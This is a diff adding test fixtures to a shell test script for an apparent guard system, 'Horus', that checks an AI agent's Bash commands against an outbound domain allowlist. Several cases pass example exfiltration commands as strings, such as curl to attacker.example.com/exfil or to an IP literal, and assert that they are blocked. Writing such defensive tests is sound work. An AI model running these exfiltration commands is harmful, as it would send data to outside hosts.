@@ -1765,6 +1765,269 @@ _run_f15_case generated-script-mutation
 _run_f15_case mcp-tool-reconfig
 _run_f15_case shell-alias-change
 
+# ── inline: F18 network-egress fixtures (ADR-005) ─────────────────────────────
+printf '\nF18 network-egress fixtures...\n'
+
+_run_f18_case() {
+  local name="$1"
+  local tmpstate; tmpstate="$(mktemp -d)"
+  local result; result=$(node - <<'NODE' "$tmpstate" "$name"
+'use strict';
+const tmpstate = process.argv[2];
+const name = process.argv[3];
+process.env.HORUS_STATE_DIR = tmpstate;
+process.env.HORUS_DECISION_JOURNAL = '0';
+
+const ne = require('./runtime/network-egress');
+const { decide } = require('./runtime/decision-engine');
+
+function out(msg) { process.stdout.write(msg); process.exit(0); }
+function assert(cond, msg) { if (!cond) out('FAIL:' + msg); }
+
+// Build a fake contract object in-memory and inject it via getContract path.
+// decide() pulls the contract via `./contract.load(projectRoot)`. Easier path:
+// directly call ne.evaluate() for unit cases, and use decide() with input that
+// triggers F18 via the loaded contract for the integration case.
+
+const allow = ['api.anthropic.com', '*.github.com', 'github.com', 'pypi.org'];
+const deny  = ['gist.github.com'];
+const policy = { allowDomains: allow, denyDomains: deny };
+
+switch (name) {
+  case 'allow-exact-match': {
+    const r = ne.evaluate('curl https://api.anthropic.com/v1/messages -d @body.json', policy);
+    assert(r.fired === false, 'expected allow, got ' + JSON.stringify(r));
+    break;
+  }
+  case 'deny-non-listed': {
+    const r = ne.evaluate('curl https://attacker.example.com/exfil', policy);
+    assert(r.fired === true && r.reason === 'host-not-in-allowlist',
+      'expected host-not-in-allowlist, got ' + JSON.stringify(r));
+    assert(r.host === 'attacker.example.com', 'expected attacker.example.com host');
+    break;
+  }
+  case 'wildcard-subdomain-match': {
+    const r1 = ne.evaluate('curl https://api.github.com/user', policy);
+    assert(r1.fired === false, 'api.github.com should match *.github.com (got ' + JSON.stringify(r1) + ')');
+    const r2 = ne.evaluate('curl https://raw.githubusercontent.com/x/y', policy);
+    assert(r2.fired === true, 'raw.githubusercontent.com is different parent — must NOT match *.github.com');
+    const r3 = ne.evaluate('curl https://deep.api.github.com/x', policy);
+    assert(r3.fired === false, 'deep.api.github.com should match *.github.com (multi-level subdomain)');
+    break;
+  }
+  case 'wildcard-apex-not-implied': {
+    // Bare *.github.com must NOT match github.com itself.
+    const onlyWildcard = { allowDomains: ['*.github.com'] };
+    const r = ne.evaluate('curl https://github.com/torvalds/linux', onlyWildcard);
+    assert(r.fired === true && r.reason === 'host-not-in-allowlist',
+      'apex github.com must require its own entry — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'deny-precedence-over-allow': {
+    // gist.github.com is wildcard-allowed via *.github.com but explicitly denied.
+    const r = ne.evaluate('curl https://gist.github.com/abc', policy);
+    assert(r.fired === true && r.reason === 'deny-domain-match',
+      'denyDomains must override allowDomains — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'ip-literal-blocked-v4': {
+    const r = ne.evaluate('curl http://203.0.113.42/exfil', policy);
+    assert(r.fired === true && r.reason === 'ip-literal-blocked',
+      'IPv4 literal must be blocked — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'ip-literal-blocked-v6': {
+    const r = ne.evaluate('curl http://[2001:db8::1]/x', policy);
+    assert(r.fired === true && r.reason === 'ip-literal-blocked',
+      'IPv6 literal must be blocked — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'loopback-allowed-v4': {
+    const r = ne.evaluate('curl http://127.0.0.1:8080/health', policy);
+    assert(r.fired === false, 'loopback IPv4 must be exempt — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'loopback-allowed-v6': {
+    const r = ne.evaluate('curl http://[::1]:8080/health', policy);
+    assert(r.fired === false, 'loopback IPv6 [::1] must be exempt — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'localhost-hostname-allowed': {
+    const r = ne.evaluate('wget http://localhost/admin', policy);
+    assert(r.fired === false, 'localhost hostname must be exempt — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'port-allowed': {
+    // Allow listing covers host regardless of port: github.com:443 is allowed.
+    const r = ne.evaluate('curl https://github.com:443/repo', policy);
+    assert(r.fired === false, 'allowDomains is host-only; port should not block — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'port-on-denied-host': {
+    const r = ne.evaluate('curl https://attacker.example.com:8443/x', policy);
+    assert(r.fired === true && r.reason === 'host-not-in-allowlist',
+      'denied host with port must still block — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'redirect-flag-policy-on-visible-url': {
+    // `curl -L` follows redirects at exec time; F18 evaluates the visible URL
+    // (envelope-bound DNS catches exec-time IP divergence via F15). We assert
+    // the visible URL is allowed; redirect target enforcement is exec-time.
+    const allowed = ne.evaluate('curl -L https://api.github.com/redirect-me', policy);
+    assert(allowed.fired === false, 'visible URL allowed; redirect handled by F15/exec-time');
+    const blocked = ne.evaluate('curl -L https://attacker.example.com/redirect', policy);
+    assert(blocked.fired === true, 'visible URL must still be policy-checked under -L');
+    break;
+  }
+  case 'doh-ip-literal-blocked': {
+    // DNS-over-HTTPS to a public resolver IP — IP-literal block fires.
+    const r = ne.evaluate('curl https://1.1.1.1/dns-query?name=example.com', policy);
+    assert(r.fired === true && r.reason === 'ip-literal-blocked',
+      'DoH via IP literal must be blocked — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'doh-allowed-via-domain': {
+    // DoH via hostname is fine if explicitly allowed.
+    const p2 = { allowDomains: ['cloudflare-dns.com'] };
+    const r = ne.evaluate('curl -H accept:application/dns-json https://cloudflare-dns.com/dns-query?name=x.com', p2);
+    assert(r.fired === false, 'DoH via allowlisted hostname must pass — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'multi-target-fail-closed': {
+    // Both URLs must be allowed. A second-position deny must short-circuit.
+    const r = ne.evaluate('curl https://api.github.com/x && curl https://attacker.example.com/y', policy);
+    assert(r.fired === true && r.reason === 'host-not-in-allowlist',
+      'second URL not allowlisted must trigger F18 — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'bare-host-curl-detected': {
+    // Bare hostname (no scheme) after curl: heuristic detection should fire.
+    const r = ne.evaluate('curl attacker.example.com/exfil', policy);
+    assert(r.fired === true && r.reason === 'host-not-in-allowlist',
+      'bare-host curl arg must be detected — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'no-network-target-passes': {
+    // Commands without any network target should not fire F18.
+    const r = ne.evaluate('npm test', policy);
+    assert(r.fired === false && r.reason === 'no-network-target',
+      'non-network command must not fire — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'no-policy-no-fire': {
+    // Backwards-compat: contract without allowDomains → F18 inactive.
+    const r = ne.evaluate('curl https://attacker.example.com/x', { outboundDeny: ['*'] });
+    assert(r.fired === false && r.reason === 'no-allow-domains',
+      'absence of allowDomains must keep F18 dormant — got ' + JSON.stringify(r));
+    break;
+  }
+  case 'pattern-validation': {
+    assert(ne.validatePattern('github.com').valid === true);
+    assert(ne.validatePattern('*.github.com').valid === true);
+    assert(ne.validatePattern('api.*.com').valid === false, 'mid-position wildcard must be rejected');
+    assert(ne.validatePattern('*.*.example.com').valid === false, 'multi-wildcard must be rejected');
+    assert(ne.validatePattern('1.2.3.4').valid === false, 'IP literal in domain list must be rejected');
+    assert(ne.validatePattern('').valid === false, 'empty pattern must be rejected');
+    break;
+  }
+  case 'integration-decide-blocks': {
+    // Build an in-memory contract, write it to a tmp project, accept it,
+    // then verify decide() short-circuits with floorFired=network-egress.
+    const fs = require('fs');
+    const os = require('os');
+    const path = require('path');
+    const crypto = require('crypto');
+    const { canonicalJson } = require('./runtime/canonical-json');
+
+    const proj = fs.mkdtempSync(path.join(os.tmpdir(), 'f18-int-'));
+    const body = {
+      version: 3,
+      contractId: 'hap-20260101-000000000001',
+      revision: 1,
+      acceptedAt: '2026-01-01T00:00:00Z',
+      acceptedBy: 'f18-test',
+      harnessScope: ['claude'],
+      trustPosture: 'balanced',
+      scopes: {
+        network: { allowDomains: ['api.anthropic.com'] },
+        payloadClasses: { A: 'allow', B: 'warn', C: 'block' },
+      },
+    };
+    body.contractHash = 'sha256:' + crypto.createHash('sha256').update(canonicalJson(body), 'utf8').digest('hex');
+    fs.writeFileSync(path.join(proj, 'horus.contract.json'), JSON.stringify(body, null, 2));
+
+    // accepted-contracts so verify() doesn't trip elsewhere
+    const accepted = path.join(tmpstate, 'accepted-contracts.json');
+    fs.writeFileSync(accepted, JSON.stringify({
+      [proj]: { contractHash: body.contractHash, acceptedAt: body.acceptedAt, revision: 1 },
+    }));
+
+    // Force-clear the contract cache between invocations
+    const { invalidateCache } = require('./runtime/contract');
+    invalidateCache();
+
+    const blocked = decide({
+      harness: 'claude',
+      tool: 'Bash',
+      command: 'curl https://attacker.example.com/exfil',
+      targetPath: proj,
+      projectRoot: proj,
+      branch: 'feature/test',
+      payloadClass: 'A',
+    });
+    assert(blocked.action === 'block' &&
+           blocked.floorFired === 'network-egress' &&
+           blocked.decisionSource === 'network-egress-denied',
+      'decide() must hard-block via F18 — got ' + JSON.stringify({a: blocked.action, f: blocked.floorFired, s: blocked.decisionSource}));
+
+    invalidateCache();
+    const allowed = decide({
+      harness: 'claude',
+      tool: 'Bash',
+      command: 'curl https://api.anthropic.com/v1/messages',
+      targetPath: proj,
+      projectRoot: proj,
+      branch: 'feature/test',
+      payloadClass: 'A',
+    });
+    assert(allowed.action !== 'block' || allowed.floorFired !== 'network-egress',
+      'allowlisted host must not fire F18 — got ' + JSON.stringify({a: allowed.action, f: allowed.floorFired}));
+    break;
+  }
+  default:
+    out('FAIL:unknown-case');
+}
+
+process.stdout.write('PASS');
+NODE
+)
+  if [ "$result" = "PASS" ]; then ok "f18:$name";
+  else fail "f18:$name" "$result"; fi
+  rm -rf "$tmpstate"
+}
+
+_run_f18_case allow-exact-match
+_run_f18_case deny-non-listed
+_run_f18_case wildcard-subdomain-match
+_run_f18_case wildcard-apex-not-implied
+_run_f18_case deny-precedence-over-allow
+_run_f18_case ip-literal-blocked-v4
+_run_f18_case ip-literal-blocked-v6
+_run_f18_case loopback-allowed-v4
+_run_f18_case loopback-allowed-v6
+_run_f18_case localhost-hostname-allowed
+_run_f18_case port-allowed
+_run_f18_case port-on-denied-host
+_run_f18_case redirect-flag-policy-on-visible-url
+_run_f18_case doh-ip-literal-blocked
+_run_f18_case doh-allowed-via-domain
+_run_f18_case multi-target-fail-closed
+_run_f18_case bare-host-curl-detected
+_run_f18_case no-network-target-passes
+_run_f18_case no-policy-no-fire
+_run_f18_case pattern-validation
+_run_f18_case integration-decide-blocks
+
 # ── summary ───────────────────────────────────────────────────────────────────
 
 printf '\n'
